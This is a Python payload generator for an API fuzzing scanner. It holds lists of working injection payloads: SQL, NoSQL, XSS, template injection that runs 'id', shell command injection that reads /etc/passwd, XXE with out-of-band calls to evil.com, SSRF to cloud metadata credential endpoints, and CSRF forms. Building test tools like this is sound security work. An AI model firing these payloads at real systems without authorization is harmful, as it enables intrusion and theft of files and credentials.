"""Intelligent payload generator for API fuzzing."""

from __future__ import annotations

import itertools
from dataclasses import dataclass, field
from typing import Any

from aegis.tools.api_fuzzing.schema import Endpoint, Parameter


@dataclass
class TestCase:
    name: str
    endpoint: str
    method: str
    headers: dict[str, str] = field(default_factory=dict)
    params: dict[str, str] = field(default_factory=dict)
    body: dict[str, Any] | str | None = None
    content_type: str = "application/json"
    description: str = ""
    category: str = ""  # injection, auth, idor, business_logic, config


# ── Injection Payloads ────────────────────────────────────────────────────────

_SQLI_PAYLOADS = [
    # Error-based
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "') OR ('1'='1",
    "1' OR '1'='1' LIMIT 1--",
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    # Blind/time-based
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",
    "1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
    # Stacked queries
    "'; DROP TABLE users--",
    "1; SELECT 1--",
    # Error extraction
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
    # PostgreSQL specific
    "';SELECT pg_sleep(5)--",
    "1' AND 1=CAST((SELECT version()) AS int)--",
    # MySQL specific
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1' AND (SELECT LOAD_FILE('/etc/passwd'))--",
    # MSSQL specific
    "'; EXEC xp_cmdshell('echo AEGIS_TEST')--",
    "1' AND 1=CONVERT(int,@@version)--",
    # Oracle specific
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    # NoSQL to SQL pivot
    "'; RETURN 1--",
    # Encoding bypasses
    "%27%20OR%20%271%27%3D%271",
    "%27%20OR%201%3D1--",
    # WAF bypass attempts
    "/**/OR/**/1=1",
    "'/*!50000OR*/1=1--",
    "0x27204F5220313D31",
    "CHAR(39)%20OR%20CHAR(49)%3DCHAR(49)",
]

_NOSQLI_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$where": "sleep(5000)"}',
    '{"$in": ["admin", "root"]}',
    '["admin", "root"]',
    '{"$gte": ""}',
    '{"$nin": []}',
    '{"$or": [{"admin": true}, {"role": "admin"}]}',
    '{"$and": [{"user": {"$ne": ""}}, {"pass": {"$ne": ""}}]}',
    '{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}',
    '{"$expr": {"$gt": [1, 0]}}',
    '{"username": "admin", "password": {"$ne": ""}}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"user": {"$exists": true}, "admin": true}',
    # MongoDB injection via array
    '{"user": {"$in": ["admin", "root"]}, "pass": {"$ne": ""}}',
    # Redis/Elasticsearch
    "*",
    "*:*",
    "admin:true",
    # Prototype pollution
    '{"__proto__": {"isAdmin": true}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
]

_XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    # Tag-based
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    # Attribute-based
    '"-alert(1)-"',
    "'-alert(1)-'",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # Event handlers
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(1)">',
    '<body onpageshow="alert(1)">',
    # JavaScript URI
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "javascript:alert(document.cookie)",
    # Data URI
    "data:text/html,<script>alert(1)</script>",
    # Template injection detection (SSTI)
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    # Encoding bypass
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # DOM clobbering
    "<a id=alert(1)>",
    "<form id=alert(1)><button>",
    # CSP bypass attempts
    "<script nonce=alert(1)>",
    "<script src=//evil.com/alert(1)>",
]

_SSTI_PAYLOADS = [
    # Jinja2/Flask
    "{{7*7}}",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    # Twig/PHP
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # Freemarker
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    # Velocity
    "#set($str=$class.inspect('java.lang.String'))#set($chr=$class.inspect('java.lang.Character'))#set($ex=$class.inspect('java.lang.Runtime').getRuntime().exec('id'))${ex}",
    # Thymeleaf
    "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
    # ERB/Ruby
    "<%= system('id') %>",
    # EJS
    "<%= global.process.mainModule.require('child_process').execSync('id') %>",
    # Handlebars
    "{{#with 's' as |stringlist|}}{{#with 'e'}}{{#with split as |conslist|}}{{#with split('a')}}{{pop}}(import{{conslist.push}}('child_process').execSync('id')){{/with}}{{/with}}{{/with}}{{/with}}",
    # Mako
    "<%import os; x=os.popen('id').read()%>${x}",
]

_COMMAND_INJECTION_PAYLOADS = [
    # Basic
    "; echo AEGIS_TEST_12345",
    "| echo AEGIS_TEST_12345",
    "$(echo AEGIS_TEST_12345)",
    "`echo AEGIS_TEST_12345`",
    # Time-based
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    # Linux specific
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; id",
    "| id",
    "; whoami",
    "| whoami",
    # Windows specific
    "& echo AEGIS_TEST_12345",
    "| echo AEGIS_TEST_12345",
    "&& echo AEGIS_TEST_12345",
    # Newline injection
    "%0aecho AEGIS_TEST_12345",
    "%0d%0aecho AEGIS_TEST_12345",
    # Variable expansion
    "${IFS}echo${IFS}AEGIS_TEST_12345",
    "{echo,AEGIS_TEST_12345}",
    # Encoding bypass
    "$(echo$IFS$IFS'AEGIS_TEST_12345')",
    # Wildcard injection
    "?etc?passwd",
    "/???/??t /???/p??s??d",
]

_XXE_PAYLOADS = [
    # Basic file read
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    # SSRF via XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    # Blind XXE (out-of-band)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe?data=exfil">]><foo>&xxe;</foo>',
    # Parameter entity
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>test</foo>',
    # SVG-based XXE
    '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
    # XInclude
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    # XSLT injection
    '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document(\'file:///etc/passwd\')"/></xsl:template></xsl:stylesheet>',
    # Error-based XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>',
]

_PATH_TRAVERSAL_PAYLOADS = [
    # Basic
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "C:\\Windows\\system32\\drivers\\etc\\hosts",
    # Encoded
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
    # Double encoding
    "%25252e%25252e%25252f",
    # Null byte (legacy)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.png",
    # Unicode
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    # Tilde expansion
    "~/../../../etc/passwd",
    # Filter bypass
    "....//....//....//etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
    # Log poisoning
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
]

_SSRF_PAYLOADS = [
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Internal services
    "http://localhost:8080/",
    "http://127.0.0.1:3000/",
    "http://[::1]:80/",
    "http://0177.0.0.1/",
    "http://0x7f.0x0.0x0.0x1/",
    # Protocol smuggling
    "gopher://localhost:25/\r\nHELO evil.com\r\n",
    "file:///etc/passwd",
    "dict://localhost:6379/CONFIG SET dir /tmp/",
    "s3://internal-bucket/",
    # DNS rebinding
    "http://localtest.me/",
    # SSRF to RCE
    "http://localhost:9200/_search?pretty",
    "http://redis:6379/",
    # Bypass filters
    "http://127.1/",
    "http://0/",
    "http://127.0.0.1.nip.io/",
    "http://decimal_ip/",
    # Internal IP ranges
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://192.168.1.1/",
]

_CSRF_PAYLOADS = [
    # Basic form
    '<form method="POST" action="TARGET"><input name="param" value="value"></form><script>document.forms[0].submit()</script>',
    # Image tag
    '<img src="TARGET?action=admin">',
    # AJAX
    '<script>var x=new XMLHttpRequest();x.open("POST","TARGET",true);x.send("param=value")</script>',
    # JSON CSRF
    '<script>fetch("TARGET",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({admin:true})})</script>',
]

_IDOR_PAYLOADS = [
    # ID manipulation
    {"id": "1", "new_id": "2"},
    {"user_id": "1", "new_user_id": "admin"},
    {"account": "self", "target": "other_user"},
    # UUID prediction
    {"uuid": "00000000-0000-0000-0000-000000000001"},
    # Parameter pollution
    {"id": "1&id=admin"},
    {"user": "me&user=admin"},
]

# ── Auth Payloads ─────────────────────────────────────────────────────────────

_AUTH_BYPASS_PAYLOADS = [
    {"name": "no_token", "headers": {}, "description": "Request without any authentication token"},
    {
        "name": "empty_bearer",
        "headers": {"Authorization": "Bearer "},
        "description": "Empty Bearer token",
    },
    {
        "name": "invalid_token",
        "headers": {"Authorization": "Bearer invalid_token_abc123"},
        "description": "Random invalid token",
    },
    {
        "name": "expired_token",
        "headers": {
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjF9.signature"
        },
        "description": "Expired JWT token",
    },
    {
        "name": "admin_token",
        "headers": {"Authorization": "Bearer admin"},
        "description": "Guess admin token",
    },
    {
        "name": "cookie_auth",
        "headers": {"Cookie": "session=admin"},
        "description": "Cookie-based auth attempt",
    },
]

_ROLE_ESCALATION_PAYLOADS = [
    {"role": "admin", "description": "Try to escalate to admin role"},
    {"role": "superadmin", "description": "Try to escalate to superadmin"},
    {"role": "root", "description": "Try to escalate to root"},
]

# ── Type-Aware Fuzz Payloads ──────────────────────────────────────────────────

_TYPE_FUZZ: dict[str, list[str]] = {
    "string": [
        "",
        " ",
        "null",
        "undefined",
        "true",
        "false",
        "0",
        "-1",
        "99999999999999999",
        "A" * 10000,
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "admin'--",
        "\x00",
        "\n\r\t",
        "\\u0000",
        "🔥",
        "%00",
    ],
    "integer": [
        "0",
        "-1",
        "1",
        "2147483647",
        "2147483648",
        "-2147483648",
        "-2147483649",
        "99999999999999999",
        "1.5",
        "abc",
        "null",
        "true",
    ],
    "number": [
        "0",
        "-0.001",
        "0.001",
        "999999999.99",
        "-999999999.99",
        "1e308",
        "1e-308",
        "NaN",
        "Infinity",
        "-Infinity",
        "abc",
    ],
    "boolean": [
        "true",
        "false",
        "0",
        "1",
        "null",
        "undefined",
        "yes",
        "no",
        "TRUE",
        "FALSE",
    ],
    "array": [
        "[]",
        "[1,2,3]",
        '["admin"]',
        "[{}]",
        "[null]",
        "[[1,2],[3,4]]",
        "not_an_array",
    ],
    "object": [
        "{}",
        '{"key": "value"}',
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        "not_an_object",
    ],
}

# ── Business Logic Payloads ───────────────────────────────────────────────────

_NEGATIVE_VALUE_PAYLOADS = [
    {"field": "quantity", "value": -1, "description": "Negative quantity"},
    {"field": "price", "value": -100, "description": "Negative price"},
    {"field": "amount", "value": 0, "description": "Zero amount"},
    {"field": "discount", "value": 100, "description": "100% discount"},
    {"field": "discount", "value": 999, "description": "Over 100% discount"},
]


def _make_test_name(endpoint: str, method: str, payload_name: str) -> str:
    return f"{method.upper()} {endpoint} - {payload_name}"


def generate_injection_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate injection test cases for an endpoint."""
    tests = []

    # Determine which payloads to use based on parameter types
    has_body = endpoint.request_body is not None
    body_schema = endpoint.request_body.schema if has_body else {}
    body_props = body_schema.get("properties", {})

    # SQL injection on all string parameters
    for param in endpoint.parameters + [
        Parameter(name=k, location="body", schema_type=v.get("type", "string"))
        for k, v in body_props.items()
    ]:
        for payload in _SQLI_PAYLOADS[:3]:  # Top 3 per param
            body = None
            params = {}
            if param.location == "body":
                body = {param.name: payload}
            elif param.location == "query":
                params[param.name] = payload
            elif param.location == "path":
                continue  # Path params handled differently

            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"SQLi-{param.name}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    params=params,
                    body=body,
                    description=f"SQL injection on {param.name}: {payload[:50]}",
                    category="injection",
                )
            )

    # NoSQL injection
    for param in body_props:
        for payload in _NOSQLI_PAYLOADS[:2]:
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"NoSQLi-{param}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={param: payload},
                    description=f"NoSQL injection on {param}",
                    category="injection",
                )
            )

    # XSS on string parameters
    for param in body_props:
        if body_props[param].get("type") == "string":
            for payload in _XSS_PAYLOADS[:2]:
                tests.append(
                    TestCase(
                        name=_make_test_name(endpoint.path, endpoint.method, f"XSS-{param}"),
                        endpoint=endpoint.path,
                        method=endpoint.method,
                        body={param: payload},
                        description=f"XSS injection on {param}",
                        category="injection",
                    )
                )

    # SSTI on all body parameters
    for param in body_props:
        for payload in _SSTI_PAYLOADS[:2]:
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"SSTI-{param}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={param: payload},
                    description=f"Server-side template injection on {param}",
                    category="injection",
                )
            )

    # Command injection on string params that might reach shell
    for param in body_props:
        if body_props[param].get("type") == "string":
            for payload in _COMMAND_INJECTION_PAYLOADS[:2]:
                tests.append(
                    TestCase(
                        name=_make_test_name(endpoint.path, endpoint.method, f"CMDi-{param}"),
                        endpoint=endpoint.path,
                        method=endpoint.method,
                        body={param: payload},
                        description=f"Command injection on {param}",
                        category="injection",
                    )
                )

    return tests


def generate_auth_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate authentication/authorization test cases."""
    tests = []

    # Skip auth tests for public endpoints (login, register, health)
    public_paths = {"/login", "/register", "/signup", "/health", "/status", "/docs"}
    if endpoint.path.lower() in public_paths:
        return tests

    # No token / invalid token tests
    for auth_test in _AUTH_BYPASS_PAYLOADS:
        tests.append(
            TestCase(
                name=_make_test_name(endpoint.path, endpoint.method, auth_test["name"]),
                endpoint=endpoint.path,
                method=endpoint.method,
                headers=auth_test["headers"],
                description=auth_test["description"],
                category="auth",
            )
        )

    return tests


def generate_type_fuzz_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate type confusion / boundary value tests."""
    tests = []

    if not endpoint.request_body:
        return tests

    body_schema = endpoint.request_body.schema
    properties = body_schema.get("properties", {})

    for prop_name, prop_schema in properties.items():
        prop_type = prop_schema.get("type", "string")
        fuzz_values = _TYPE_FUZZ.get(prop_type, _TYPE_FUZZ["string"])

        for fuzz_value in fuzz_values[:4]:  # Top 4 per type
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"TypeFuzz-{prop_name}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={prop_name: fuzz_value},
                    description=f"Type confusion on {prop_name} (expected {prop_type}): {str(fuzz_value)[:50]}",
                    category="injection",
                )
            )

    return tests


def generate_business_logic_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate business logic test cases."""
    tests = []

    # Negative value tests for write endpoints
    if endpoint.method in ("POST", "PUT", "PATCH"):
        for payload in _NEGATIVE_VALUE_PAYLOADS:
            tests.append(
                TestCase(
                    name=_make_test_name(
                        endpoint.path, endpoint.method, f"BizLogic-{payload['field']}"
                    ),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={payload["field"]: payload["value"]},
                    description=payload["description"],
                    category="business_logic",
                )
            )

    return tests


def generate_ssrf_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate SSRF test cases for parameters that accept URLs."""
    tests = []

    if not endpoint.request_body:
        return tests

    body_schema = endpoint.request_body.schema
    properties = body_schema.get("properties", {})

    url_params = [
        name
        for name, schema in properties.items()
        if schema.get("type") == "string"
        and any(
            kw in name.lower()
            for kw in [
                "url",
                "uri",
                "link",
                "src",
                "href",
                "callback",
                "redirect",
                "webhook",
                "feed",
                "image",
            ]
        )
    ]

    # Also test all string params for SSRF if no obvious URL params
    if not url_params:
        url_params = [name for name, schema in properties.items() if schema.get("type") == "string"]

    for param in url_params[:3]:
        for payload in _SSRF_PAYLOADS[:5]:
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"SSRF-{param}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={param: payload},
                    description=f"SSRF via {param}: {payload[:50]}",
                    category="ssrf",
                )
            )

    return tests


def generate_csrf_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate CSRF test cases for state-changing endpoints."""
    tests = []

    if endpoint.method not in ("POST", "PUT", "PATCH", "DELETE"):
        return tests

    # Skip auth endpoints (login, register) — CSRF on these is expected
    skip_paths = {"/login", "/register", "/signup", "/auth/login", "/auth/register"}
    if endpoint.path.lower() in skip_paths:
        return tests

    for payload in _CSRF_PAYLOADS[:2]:
        tests.append(
            TestCase(
                name=_make_test_name(endpoint.path, endpoint.method, "CSRF"),
                endpoint=endpoint.path,
                method=endpoint.method,
                body={"_csrf_test": "1"},
                description=f"CSRF test: {payload[:60]}",
                category="csrf",
            )
        )

    return tests


def generate_idor_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate IDOR test cases for endpoints with ID-like parameters."""
    tests = []

    id_params = []
    if endpoint.request_body:
        body_schema = endpoint.request_body.schema
        properties = body_schema.get("properties", {})
        id_params.extend(
            name
            for name in properties
            if any(kw in name.lower() for kw in ["id", "user", "account", "uuid", "key"])
        )

    for param in endpoint.parameters:
        if any(kw in param.name.lower() for kw in ["id", "user", "account"]):
            id_params.append(param.name)

    for param in id_params[:3]:
        for payload in _IDOR_PAYLOADS[:3]:
            test_body = {}
            if endpoint.request_body:
                test_body = {param: payload.get("new_id", payload.get("target", "admin"))}
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"IDOR-{param}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body=test_body if test_body else None,
                    params={param: str(payload.get("new_id", "2"))}
                    if param in [p.name for p in endpoint.parameters]
                    else {},
                    description=f"IDOR test on {param}: attempt cross-user access",
                    category="idor",
                )
            )

    return tests


def generate_test_cases(endpoint: Endpoint) -> list[TestCase]:
    """Generate all test cases for an endpoint."""
    tests = []
    tests.extend(generate_injection_tests(endpoint))
    tests.extend(generate_auth_tests(endpoint))
    tests.extend(generate_type_fuzz_tests(endpoint))
    tests.extend(generate_business_logic_tests(endpoint))
    tests.extend(generate_ssrf_tests(endpoint))
    tests.extend(generate_csrf_tests(endpoint))
    tests.extend(generate_idor_tests(endpoint))
    return tests
